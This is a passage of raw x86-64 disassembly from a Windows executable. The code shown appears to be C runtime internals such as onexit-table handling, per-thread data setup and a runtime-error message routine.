   1400032b9:	48 83 ec 20          	sub    $0x20,%rsp
   1400032bd:	4c 8b f1             	mov    %rcx,%r14
   1400032c0:	e8 43 ed ff ff       	call   0x140002008
   1400032c5:	90                   	nop
   1400032c6:	48 8b 0d cb 34 01 00 	mov    0x134cb(%rip),%rcx        # 0x140016798
   1400032cd:	e8 d6 01 00 00       	call   0x1400034a8
   1400032d2:	4c 8b e0             	mov    %rax,%r12
   1400032d5:	48 8b 0d b4 34 01 00 	mov    0x134b4(%rip),%rcx        # 0x140016790
   1400032dc:	e8 c7 01 00 00       	call   0x1400034a8
   1400032e1:	48 8b d8             	mov    %rax,%rbx
   1400032e4:	49 3b c4             	cmp    %r12,%rax
   1400032e7:	0f 82 98 00 00 00    	jb     0x140003385
   1400032ed:	48 8b f8             	mov    %rax,%rdi
   1400032f0:	49 2b fc             	sub    %r12,%rdi
   1400032f3:	4c 8d 6f 08          	lea    0x8(%rdi),%r13
   1400032f7:	49 83 fd 08          	cmp    $0x8,%r13
   1400032fb:	0f 82 84 00 00 00    	jb     0x140003385
   140003301:	49 8b cc             	mov    %r12,%rcx
   140003304:	e8 b3 2c 00 00       	call   0x140005fbc
   140003309:	48 8b f0             	mov    %rax,%rsi
   14000330c:	49 3b c5             	cmp    %r13,%rax
   14000330f:	73 54                	jae    0x140003365
   140003311:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003316:	48 3b c2             	cmp    %rdx,%rax
   140003319:	48 0f 42 d0          	cmovb  %rax,%rdx
   14000331d:	48 03 d0             	add    %rax,%rdx
   140003320:	48 3b d0             	cmp    %rax,%rdx
   140003323:	72 11                	jb     0x140003336
   140003325:	49 8b cc             	mov    %r12,%rcx
   140003328:	e8 07 2c 00 00       	call   0x140005f34
   14000332d:	33 db                	xor    %ebx,%ebx
   14000332f:	48 3b c3             	cmp    %rbx,%rax
   140003332:	75 1a                	jne    0x14000334e
   140003334:	eb 02                	jmp    0x140003338
   140003336:	33 db                	xor    %ebx,%ebx
   140003338:	48 8d 56 20          	lea    0x20(%rsi),%rdx
   14000333c:	48 3b d6             	cmp    %rsi,%rdx
   14000333f:	72 46                	jb     0x140003387
   140003341:	49 8b cc             	mov    %r12,%rcx
   140003344:	e8 eb 2b 00 00       	call   0x140005f34
   140003349:	48 3b c3             	cmp    %rbx,%rax
   14000334c:	74 39                	je     0x140003387
   14000334e:	48 c1 ff 03          	sar    $0x3,%rdi
   140003352:	48 8d 1c f8          	lea    (%rax,%rdi,8),%rbx
   140003356:	48 8b c8             	mov    %rax,%rcx
   140003359:	e8 36 01 00 00       	call   0x140003494
   14000335e:	48 89 05 33 34 01 00 	mov    %rax,0x13433(%rip)        # 0x140016798
   140003365:	49 8b ce             	mov    %r14,%rcx
   140003368:	e8 27 01 00 00       	call   0x140003494
   14000336d:	48 89 03             	mov    %rax,(%rbx)
   140003370:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140003374:	e8 1b 01 00 00       	call   0x140003494
   140003379:	48 89 05 10 34 01 00 	mov    %rax,0x13410(%rip)        # 0x140016790
   140003380:	49 8b de             	mov    %r14,%rbx
   140003383:	eb 02                	jmp    0x140003387
   140003385:	33 db                	xor    %ebx,%ebx
   140003387:	e8 88 ec ff ff       	call   0x140002014
   14000338c:	48 8b c3             	mov    %rbx,%rax
   14000338f:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003394:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140003399:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   14000339e:	48 83 c4 20          	add    $0x20,%rsp
   1400033a2:	41 5e                	pop    %r14
   1400033a4:	41 5d                	pop    %r13
   1400033a6:	41 5c                	pop    %r12
   1400033a8:	c3                   	ret
   1400033a9:	cc                   	int3
   1400033aa:	cc                   	int3
   1400033ab:	cc                   	int3
   1400033ac:	48 83 ec 28          	sub    $0x28,%rsp
   1400033b0:	e8 ef fe ff ff       	call   0x1400032a4
   1400033b5:	48 f7 d8             	neg    %rax
   1400033b8:	1b c0                	sbb    %eax,%eax
   1400033ba:	f7 d8                	neg    %eax
   1400033bc:	ff c8                	dec    %eax
   1400033be:	48 83 c4 28          	add    $0x28,%rsp
   1400033c2:	c3                   	ret
   1400033c3:	cc                   	int3
   1400033c4:	48 89 0d ed 17 01 00 	mov    %rcx,0x117ed(%rip)        # 0x140014bb8
   1400033cb:	c3                   	ret
   1400033cc:	40 53                	rex push %rbx
   1400033ce:	48 83 ec 20          	sub    $0x20,%rsp
   1400033d2:	48 8b d9             	mov    %rcx,%rbx
   1400033d5:	48 8b 0d dc 17 01 00 	mov    0x117dc(%rip),%rcx        # 0x140014bb8
   1400033dc:	e8 c7 00 00 00       	call   0x1400034a8
   1400033e1:	48 85 c0             	test   %rax,%rax
   1400033e4:	74 10                	je     0x1400033f6
   1400033e6:	48 8b cb             	mov    %rbx,%rcx
   1400033e9:	ff d0                	call   *%rax
   1400033eb:	85 c0                	test   %eax,%eax
   1400033ed:	74 07                	je     0x1400033f6
   1400033ef:	b8 01 00 00 00       	mov    $0x1,%eax
   1400033f4:	eb 02                	jmp    0x1400033f8
   1400033f6:	33 c0                	xor    %eax,%eax
   1400033f8:	48 83 c4 20          	add    $0x20,%rsp
   1400033fc:	5b                   	pop    %rbx
   1400033fd:	c3                   	ret
   1400033fe:	cc                   	int3
   1400033ff:	cc                   	int3
   140003400:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003405:	57                   	push   %rdi
   140003406:	48 83 ec 60          	sub    $0x60,%rsp
   14000340a:	48 8b fa             	mov    %rdx,%rdi
   14000340d:	48 8b d9             	mov    %rcx,%rbx
   140003410:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003415:	48 8d 15 94 af 00 00 	lea    0xaf94(%rip),%rdx        # 0x14000e3b0
   14000341c:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140003422:	e8 49 f7 ff ff       	call   0x140002b70
   140003427:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000342c:	48 8b cf             	mov    %rdi,%rcx
   14000342f:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140003434:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   140003439:	e8 a8 71 00 00       	call   0x14000a5e6
   14000343e:	4c 8b d8             	mov    %rax,%r11
   140003441:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140003446:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000344b:	48 85 ff             	test   %rdi,%rdi
   14000344e:	74 1e                	je     0x14000346e
   140003450:	f6 07 08             	testb  $0x8,(%rdi)
   140003453:	b9 00 40 99 01       	mov    $0x1994000,%ecx
   140003458:	74 06                	je     0x140003460
   14000345a:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   14000345e:	eb 0e                	jmp    0x14000346e
   140003460:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140003464:	4d 85 db             	test   %r11,%r11
   140003467:	0f 44 c1             	cmove  %ecx,%eax
   14000346a:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000346e:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
   140003473:	8b 54 24 24          	mov    0x24(%rsp),%edx
   140003477:	8b 4c 24 20          	mov    0x20(%rsp),%ecx
   14000347b:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140003480:	ff 15 d2 ac 00 00    	call   *0xacd2(%rip)        # 0x14000e158
   140003486:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   14000348b:	48 83 c4 60          	add    $0x60,%rsp
   14000348f:	5f                   	pop    %rdi
   140003490:	c3                   	ret
   140003491:	cc                   	int3
   140003492:	cc                   	int3
   140003493:	cc                   	int3
   140003494:	48 ff 25 cd ac 00 00 	rex.W jmp *0xaccd(%rip)        # 0x14000e168
   14000349b:	cc                   	int3
   14000349c:	33 c9                	xor    %ecx,%ecx
   14000349e:	48 ff 25 c3 ac 00 00 	rex.W jmp *0xacc3(%rip)        # 0x14000e168
   1400034a5:	cc                   	int3
   1400034a6:	cc                   	int3
   1400034a7:	cc                   	int3
   1400034a8:	48 ff 25 c1 ac 00 00 	rex.W jmp *0xacc1(%rip)        # 0x14000e170
   1400034af:	cc                   	int3
   1400034b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400034b4:	8b 0d 26 fd 00 00    	mov    0xfd26(%rip),%ecx        # 0x1400131e0
   1400034ba:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400034bd:	74 0d                	je     0x1400034cc
   1400034bf:	ff 15 c3 ac 00 00    	call   *0xacc3(%rip)        # 0x14000e188
   1400034c5:	83 0d 14 fd 00 00 ff 	orl    $0xffffffff,0xfd14(%rip)        # 0x1400131e0
   1400034cc:	48 83 c4 28          	add    $0x28,%rsp
   1400034d0:	e9 13 06 00 00       	jmp    0x140003ae8
   1400034d5:	cc                   	int3
   1400034d6:	cc                   	int3
   1400034d7:	cc                   	int3
   1400034d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400034dd:	57                   	push   %rdi
   1400034de:	48 83 ec 20          	sub    $0x20,%rsp
   1400034e2:	48 8b fa             	mov    %rdx,%rdi
   1400034e5:	48 8b d9             	mov    %rcx,%rbx
   1400034e8:	48 8d 05 f1 b4 00 00 	lea    0xb4f1(%rip),%rax        # 0x14000e9e0
   1400034ef:	48 89 81 a0 00 00 00 	mov    %rax,0xa0(%rcx)
   1400034f6:	c7 41 1c 01 00 00 00 	movl   $0x1,0x1c(%rcx)
   1400034fd:	c7 81 c8 00 00 00 01 	movl   $0x1,0xc8(%rcx)
   140003504:	00 00 00 
   140003507:	c6 81 74 01 00 00 43 	movb   $0x43,0x174(%rcx)
   14000350e:	c6 81 f7 01 00 00 43 	movb   $0x43,0x1f7(%rcx)
   140003515:	48 8d 05 f4 02 01 00 	lea    0x102f4(%rip),%rax        # 0x140013810
   14000351c:	48 89 81 b8 00 00 00 	mov    %rax,0xb8(%rcx)
   140003523:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140003528:	e8 3f 07 00 00       	call   0x140003c6c
   14000352d:	90                   	nop
   14000352e:	48 8b 83 b8 00 00 00 	mov    0xb8(%rbx),%rax
   140003535:	f0 83 00 01          	lock addl $0x1,(%rax)
   140003539:	b9 0d 00 00 00       	mov    $0xd,%ecx
   14000353e:	e8 29 06 00 00       	call   0x140003b6c
   140003543:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140003548:	e8 1f 07 00 00       	call   0x140003c6c
   14000354d:	90                   	nop
   14000354e:	48 89 bb c0 00 00 00 	mov    %rdi,0xc0(%rbx)
   140003555:	48 85 ff             	test   %rdi,%rdi
   140003558:	75 0e                	jne    0x140003568
   14000355a:	48 8b 05 8f 02 01 00 	mov    0x1028f(%rip),%rax        # 0x1400137f0
   140003561:	48 89 83 c0 00 00 00 	mov    %rax,0xc0(%rbx)
   140003568:	48 8b 8b c0 00 00 00 	mov    0xc0(%rbx),%rcx
   14000356f:	e8 0c 2c 00 00       	call   0x140006180
   140003574:	90                   	nop
   140003575:	b9 0c 00 00 00       	mov    $0xc,%ecx
   14000357a:	e8 ed 05 00 00       	call   0x140003b6c
   14000357f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003584:	48 83 c4 20          	add    $0x20,%rsp
   140003588:	5f                   	pop    %rdi
   140003589:	c3                   	ret
   14000358a:	cc                   	int3
   14000358b:	cc                   	int3
   14000358c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003591:	57                   	push   %rdi
   140003592:	48 83 ec 20          	sub    $0x20,%rsp
   140003596:	ff 15 b4 aa 00 00    	call   *0xaab4(%rip)        # 0x14000e050
   14000359c:	8b 0d 3e fc 00 00    	mov    0xfc3e(%rip),%ecx        # 0x1400131e0
   1400035a2:	8b f8                	mov    %eax,%edi
   1400035a4:	ff 15 ce ab 00 00    	call   *0xabce(%rip)        # 0x14000e178
   1400035aa:	48 8b d8             	mov    %rax,%rbx
   1400035ad:	48 85 c0             	test   %rax,%rax
   1400035b0:	75 48                	jne    0x1400035fa
   1400035b2:	8d 48 01             	lea    0x1(%rax),%ecx
   1400035b5:	ba c8 02 00 00       	mov    $0x2c8,%edx
   1400035ba:	e8 f1 28 00 00       	call   0x140005eb0
   1400035bf:	48 8b d8             	mov    %rax,%rbx
   1400035c2:	48 85 c0             	test   %rax,%rax
   1400035c5:	74 33                	je     0x1400035fa
   1400035c7:	8b 0d 13 fc 00 00    	mov    0xfc13(%rip),%ecx        # 0x1400131e0
   1400035cd:	48 8b d0             	mov    %rax,%rdx
   1400035d0:	ff 15 aa ab 00 00    	call   *0xabaa(%rip)        # 0x14000e180
   1400035d6:	48 8b cb             	mov    %rbx,%rcx
   1400035d9:	85 c0                	test   %eax,%eax
   1400035db:	74 16                	je     0x1400035f3
   1400035dd:	33 d2                	xor    %edx,%edx
   1400035df:	e8 f4 fe ff ff       	call   0x1400034d8
   1400035e4:	ff 15 ae ab 00 00    	call   *0xabae(%rip)        # 0x14000e198
   1400035ea:	48 83 4b 08 ff       	orq    $0xffffffffffffffff,0x8(%rbx)
   1400035ef:	89 03                	mov    %eax,(%rbx)
   1400035f1:	eb 07                	jmp    0x1400035fa
   1400035f3:	e8 20 f4 ff ff       	call   0x140002a18
   1400035f8:	33 db                	xor    %ebx,%ebx
   1400035fa:	8b cf                	mov    %edi,%ecx
   1400035fc:	ff 15 8e ab 00 00    	call   *0xab8e(%rip)        # 0x14000e190
   140003602:	48 8b c3             	mov    %rbx,%rax
   140003605:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000360a:	48 83 c4 20          	add    $0x20,%rsp
   14000360e:	5f                   	pop    %rdi
   14000360f:	c3                   	ret
   140003610:	40 53                	rex push %rbx
   140003612:	48 83 ec 20          	sub    $0x20,%rsp
   140003616:	e8 71 ff ff ff       	call   0x14000358c
   14000361b:	48 8b d8             	mov    %rax,%rbx
   14000361e:	48 85 c0             	test   %rax,%rax
   140003621:	75 08                	jne    0x14000362b
   140003623:	8d 48 10             	lea    0x10(%rax),%ecx
   140003626:	e8 59 e9 ff ff       	call   0x140001f84
   14000362b:	48 8b c3             	mov    %rbx,%rax
   14000362e:	48 83 c4 20          	add    $0x20,%rsp
   140003632:	5b                   	pop    %rbx
   140003633:	c3                   	ret
   140003634:	48 85 c9             	test   %rcx,%rcx
   140003637:	0f 84 2b 01 00 00    	je     0x140003768
   14000363d:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003642:	57                   	push   %rdi
   140003643:	48 83 ec 20          	sub    $0x20,%rsp
   140003647:	48 8b d9             	mov    %rcx,%rbx
   14000364a:	48 8b 49 38          	mov    0x38(%rcx),%rcx
   14000364e:	48 85 c9             	test   %rcx,%rcx
   140003651:	74 05                	je     0x140003658
   140003653:	e8 c0 f3 ff ff       	call   0x140002a18
   140003658:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   14000365c:	48 85 c9             	test   %rcx,%rcx
   14000365f:	74 05                	je     0x140003666
   140003661:	e8 b2 f3 ff ff       	call   0x140002a18
   140003666:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   14000366a:	48 85 c9             	test   %rcx,%rcx
   14000366d:	74 05                	je     0x140003674
   14000366f:	e8 a4 f3 ff ff       	call   0x140002a18
   140003674:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140003678:	48 85 c9             	test   %rcx,%rcx
   14000367b:	74 05                	je     0x140003682
   14000367d:	e8 96 f3 ff ff       	call   0x140002a18
   140003682:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   140003686:	48 85 c9             	test   %rcx,%rcx
   140003689:	74 05                	je     0x140003690
   14000368b:	e8 88 f3 ff ff       	call   0x140002a18
   140003690:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   140003694:	48 85 c9             	test   %rcx,%rcx
   140003697:	74 05                	je     0x14000369e
   140003699:	e8 7a f3 ff ff       	call   0x140002a18
   14000369e:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   1400036a5:	48 85 c9             	test   %rcx,%rcx
   1400036a8:	74 05                	je     0x1400036af
   1400036aa:	e8 69 f3 ff ff       	call   0x140002a18
   1400036af:	48 8b 8b a0 00 00 00 	mov    0xa0(%rbx),%rcx
   1400036b6:	48 8d 05 23 b3 00 00 	lea    0xb323(%rip),%rax        # 0x14000e9e0
   1400036bd:	48 3b c8             	cmp    %rax,%rcx
   1400036c0:	74 05                	je     0x1400036c7
   1400036c2:	e8 51 f3 ff ff       	call   0x140002a18
   1400036c7:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1400036cc:	e8 9b 05 00 00       	call   0x140003c6c
   1400036d1:	90                   	nop
   1400036d2:	48 8b 8b b8 00 00 00 	mov    0xb8(%rbx),%rcx
   1400036d9:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400036de:	48 85 c9             	test   %rcx,%rcx
   1400036e1:	74 1d                	je     0x140003700
   1400036e3:	f0 83 01 ff          	lock addl $0xffffffff,(%rcx)
   1400036e7:	75 17                	jne    0x140003700
   1400036e9:	48 8d 05 20 01 01 00 	lea    0x10120(%rip),%rax        # 0x140013810
   1400036f0:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400036f5:	48 3b c8             	cmp    %rax,%rcx
   1400036f8:	74 06                	je     0x140003700
   1400036fa:	e8 19 f3 ff ff       	call   0x140002a18
   1400036ff:	90                   	nop
   140003700:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140003705:	e8 62 04 00 00       	call   0x140003b6c
   14000370a:	b9 0c 00 00 00       	mov    $0xc,%ecx
   14000370f:	e8 58 05 00 00       	call   0x140003c6c
   140003714:	90                   	nop
   140003715:	48 8b bb c0 00 00 00 	mov    0xc0(%rbx),%rdi
   14000371c:	48 85 ff             	test   %rdi,%rdi
   14000371f:	74 2b                	je     0x14000374c
   140003721:	48 8b cf             	mov    %rdi,%rcx
   140003724:	e8 ef 2a 00 00       	call   0x140006218
   140003729:	48 3b 3d c0 00 01 00 	cmp    0x100c0(%rip),%rdi        # 0x1400137f0
   140003730:	74 1a                	je     0x14000374c
   140003732:	48 8d 05 57 ff 00 00 	lea    0xff57(%rip),%rax        # 0x140013690
   140003739:	48 3b f8             	cmp    %rax,%rdi
   14000373c:	74 0e                	je     0x14000374c
   14000373e:	83 3f 00             	cmpl   $0x0,(%rdi)
   140003741:	75 09                	jne    0x14000374c
   140003743:	48 8b cf             	mov    %rdi,%rcx
   140003746:	e8 b9 28 00 00       	call   0x140006004
   14000374b:	90                   	nop
   14000374c:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140003751:	e8 16 04 00 00       	call   0x140003b6c
   140003756:	48 8b cb             	mov    %rbx,%rcx
   140003759:	e8 ba f2 ff ff       	call   0x140002a18
   14000375e:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140003763:	48 83 c4 20          	add    $0x20,%rsp
   140003767:	5f                   	pop    %rdi
   140003768:	c3                   	ret
   140003769:	cc                   	int3
   14000376a:	cc                   	int3
   14000376b:	cc                   	int3
   14000376c:	40 53                	rex push %rbx
   14000376e:	48 83 ec 20          	sub    $0x20,%rsp
   140003772:	e8 8d eb ff ff       	call   0x140002304
   140003777:	e8 e0 02 00 00       	call   0x140003a5c
   14000377c:	85 c0                	test   %eax,%eax
   14000377e:	74 60                	je     0x1400037e0
   140003780:	48 8d 0d ad fe ff ff 	lea    -0x153(%rip),%rcx        # 0x140003634
   140003787:	ff 15 13 aa 00 00    	call   *0xaa13(%rip)        # 0x14000e1a0
   14000378d:	89 05 4d fa 00 00    	mov    %eax,0xfa4d(%rip)        # 0x1400131e0
   140003793:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003796:	74 48                	je     0x1400037e0
   140003798:	ba c8 02 00 00       	mov    $0x2c8,%edx
   14000379d:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400037a2:	e8 09 27 00 00       	call   0x140005eb0
   1400037a7:	48 8b d8             	mov    %rax,%rbx
   1400037aa:	48 85 c0             	test   %rax,%rax
   1400037ad:	74 31                	je     0x1400037e0
   1400037af:	8b 0d 2b fa 00 00    	mov    0xfa2b(%rip),%ecx        # 0x1400131e0
   1400037b5:	48 8b d0             	mov    %rax,%rdx
   1400037b8:	ff 15 c2 a9 00 00    	call   *0xa9c2(%rip)        # 0x14000e180
   1400037be:	85 c0                	test   %eax,%eax
   1400037c0:	74 1e                	je     0x1400037e0
   1400037c2:	33 d2                	xor    %edx,%edx
   1400037c4:	48 8b cb             	mov    %rbx,%rcx
   1400037c7:	e8 0c fd ff ff       	call   0x1400034d8
   1400037cc:	ff 15 c6 a9 00 00    	call   *0xa9c6(%rip)        # 0x14000e198
   1400037d2:	48 83 4b 08 ff       	orq    $0xffffffffffffffff,0x8(%rbx)
   1400037d7:	89 03                	mov    %eax,(%rbx)
   1400037d9:	b8 01 00 00 00       	mov    $0x1,%eax
   1400037de:	eb 07                	jmp    0x1400037e7
   1400037e0:	e8 cb fc ff ff       	call   0x1400034b0
   1400037e5:	33 c0                	xor    %eax,%eax
   1400037e7:	48 83 c4 20          	add    $0x20,%rsp
   1400037eb:	5b                   	pop    %rbx
   1400037ec:	c3                   	ret
   1400037ed:	cc                   	int3
   1400037ee:	cc                   	int3
   1400037ef:	cc                   	int3
   1400037f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400037f5:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400037fa:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1400037ff:	41 56                	push   %r14
   140003801:	48 83 ec 30          	sub    $0x30,%rsp
   140003805:	4c 8d 35 e4 f9 00 00 	lea    0xf9e4(%rip),%r14        # 0x1400131f0
   14000380c:	8b f9                	mov    %ecx,%edi
   14000380e:	33 db                	xor    %ebx,%ebx
   140003810:	49 8b c6             	mov    %r14,%rax
   140003813:	3b 08                	cmp    (%rax),%ecx
   140003815:	74 0b                	je     0x140003822
   140003817:	ff c3                	inc    %ebx
   140003819:	48 83 c0 10          	add    $0x10,%rax
   14000381d:	83 fb 17             	cmp    $0x17,%ebx
   140003820:	72 f1                	jb     0x140003813
   140003822:	83 fb 17             	cmp    $0x17,%ebx
   140003825:	0f 83 d4 01 00 00    	jae    0x1400039ff
   14000382b:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003830:	e8 0f 37 00 00       	call   0x140006f44
   140003835:	83 f8 01             	cmp    $0x1,%eax
   140003838:	0f 84 7c 01 00 00    	je     0x1400039ba
   14000383e:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003843:	e8 fc 36 00 00       	call   0x140006f44
   140003848:	85 c0                	test   %eax,%eax
   14000384a:	75 0d                	jne    0x140003859
   14000384c:	83 3d ed f7 00 00 01 	cmpl   $0x1,0xf7ed(%rip)        # 0x140013040
   140003853:	0f 84 61 01 00 00    	je     0x1400039ba
   140003859:	81 ff fc 00 00 00    	cmp    $0xfc,%edi
   14000385f:	0f 84 9a 01 00 00    	je     0x1400039ff
   140003865:	48 8d 3d 54 13 01 00 	lea    0x11354(%rip),%rdi        # 0x140014bc0
   14000386c:	41 bd 14 03 00 00    	mov    $0x314,%r13d
   140003872:	4c 8d 05 47 b1 00 00 	lea    0xb147(%rip),%r8        # 0x14000e9c0
   140003879:	48 8b cf             	mov    %rdi,%rcx
   14000387c:	49 8b d5             	mov    %r13,%rdx
   14000387f:	e8 a8 ef ff ff       	call   0x14000282c
   140003884:	85 c0                	test   %eax,%eax
   140003886:	74 15                	je     0x14000389d
   140003888:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000388e:	45 33 c9             	xor    %r9d,%r9d
   140003891:	45 33 c0             	xor    %r8d,%r8d
   140003894:	33 d2                	xor    %edx,%edx
   140003896:	33 c9                	xor    %ecx,%ecx
   140003898:	e8 0f f6 ff ff       	call   0x140002eac
   14000389d:	48 8d 15 35 13 01 00 	lea    0x11335(%rip),%rdx        # 0x140014bd9
   1400038a4:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400038aa:	33 c9                	xor    %ecx,%ecx
   1400038ac:	c6 05 2a 14 01 00 00 	movb   $0x0,0x1142a(%rip)        # 0x140014cdd
   1400038b3:	ff 15 57 a7 00 00    	call   *0xa757(%rip)        # 0x14000e010
   1400038b9:	85 c0                	test   %eax,%eax
   1400038bb:	75 31                	jne    0x1400038ee
   1400038bd:	4c 8d 05 e4 b0 00 00 	lea    0xb0e4(%rip),%r8        # 0x14000e9a8
   1400038c4:	48 8d 0d 0e 13 01 00 	lea    0x1130e(%rip),%rcx        # 0x140014bd9
   1400038cb:	ba fb 02 00 00       	mov    $0x2fb,%edx
   1400038d0:	e8 57 ef ff ff       	call   0x14000282c
   1400038d5:	85 c0                	test   %eax,%eax
   1400038d7:	74 15                	je     0x1400038ee
   1400038d9:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400038df:	45 33 c9             	xor    %r9d,%r9d
   1400038e2:	45 33 c0             	xor    %r8d,%r8d
   1400038e5:	33 d2                	xor    %edx,%edx
   1400038e7:	33 c9                	xor    %ecx,%ecx
   1400038e9:	e8 be f5 ff ff       	call   0x140002eac
   1400038ee:	48 8d 0d e4 12 01 00 	lea    0x112e4(%rip),%rcx        # 0x140014bd9
   1400038f5:	e8 76 f0 ff ff       	call   0x140002970
   1400038fa:	48 ff c0             	inc    %rax
   1400038fd:	48 83 f8 3c          	cmp    $0x3c,%rax
   140003901:	76 46                	jbe    0x140003949
   140003903:	48 8d 0d cf 12 01 00 	lea    0x112cf(%rip),%rcx        # 0x140014bd9
   14000390a:	e8 61 f0 ff ff       	call   0x140002970
   14000390f:	48 8d 15 be 15 01 00 	lea    0x115be(%rip),%rdx        # 0x140014ed4
   140003916:	4c 8d 05 87 b0 00 00 	lea    0xb087(%rip),%r8        # 0x14000e9a4
   14000391d:	48 8d 4c 38 de       	lea    -0x22(%rax,%rdi,1),%rcx
   140003922:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   140003928:	48 2b d1             	sub    %rcx,%rdx
   14000392b:	e8 3c 35 00 00       	call   0x140006e6c
   140003930:	85 c0                	test   %eax,%eax
   140003932:	74 15                	je     0x140003949
   140003934:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000393a:	45 33 c9             	xor    %r9d,%r9d
   14000393d:	45 33 c0             	xor    %r8d,%r8d
   140003940:	33 d2                	xor    %edx,%edx
   140003942:	33 c9                	xor    %ecx,%ecx
   140003944:	e8 63 f5 ff ff       	call   0x140002eac
   140003949:	4c 8d 05 50 b0 00 00 	lea    0xb050(%rip),%r8        # 0x14000e9a0
   140003950:	49 8b d5             	mov    %r13,%rdx
   140003953:	48 8b cf             	mov    %rdi,%rcx
   140003956:	e8 85 34 00 00       	call   0x140006de0
   14000395b:	85 c0                	test   %eax,%eax
   14000395d:	74 15                	je     0x140003974
   14000395f:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140003965:	45 33 c9             	xor    %r9d,%r9d
   140003968:	45 33 c0             	xor    %r8d,%r8d
   14000396b:	33 d2                	xor    %edx,%edx
   14000396d:	33 c9                	xor    %ecx,%ecx
   14000396f:	e8 38 f5 ff ff       	call   0x140002eac
   140003974:	4c 63 c3             	movslq %ebx,%r8
   140003977:	49 8b d5             	mov    %r13,%rdx
   14000397a:	48 8b cf             	mov    %rdi,%rcx
   14000397d:	4d 03 c0             	add    %r8,%r8
   140003980:	4f 8b 44 c6 08       	mov    0x8(%r14,%r8,8),%r8
   140003985:	e8 56 34 00 00       	call   0x140006de0
   14000398a:	85 c0                	test   %eax,%eax
   14000398c:	74 15                	je     0x1400039a3
   14000398e:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140003994:	45 33 c9             	xor    %r9d,%r9d
   140003997:	45 33 c0             	xor    %r8d,%r8d
   14000399a:	33 d2                	xor    %edx,%edx
   14000399c:	33 c9                	xor    %ecx,%ecx
   14000399e:	e8 09 f5 ff ff       	call   0x140002eac
   1400039a3:	48 8d 15 ce af 00 00 	lea    0xafce(%rip),%rdx        # 0x14000e978
   1400039aa:	41 b8 10 20 01 00    	mov    $0x12010,%r8d
   1400039b0:	48 8b cf             	mov    %rdi,%rcx
   1400039b3:	e8 34 32 00 00       	call   0x140006bec
   1400039b8:	eb 45                	jmp    0x1400039ff
   1400039ba:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   1400039bf:	ff 15 eb a7 00 00    	call   *0xa7eb(%rip)        # 0x14000e1b0
   1400039c5:	48 8b f8             	mov    %rax,%rdi
   1400039c8:	48 85 c0             	test   %rax,%rax
   1400039cb:	74 32                	je     0x1400039ff
   1400039cd:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400039d1:	74 2c                	je     0x1400039ff
   1400039d3:	48 63 db             	movslq %ebx,%rbx
   1400039d6:	48 03 db             	add    %rbx,%rbx
   1400039d9:	49 8b 4c de 08       	mov    0x8(%r14,%rbx,8),%rcx
   1400039de:	e8 8d ef ff ff       	call   0x140002970
   1400039e3:	49 8b 54 de 08       	mov    0x8(%r14,%rbx,8),%rdx
   1400039e8:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400039ee:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   1400039f3:	4c 8b c0             	mov    %rax,%r8
   1400039f6:	48 8b cf             	mov    %rdi,%rcx
   1400039f9:	ff 15 a9 a7 00 00    	call   *0xa7a9(%rip)        # 0x14000e1a8
   1400039ff:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003a04:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140003a09:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
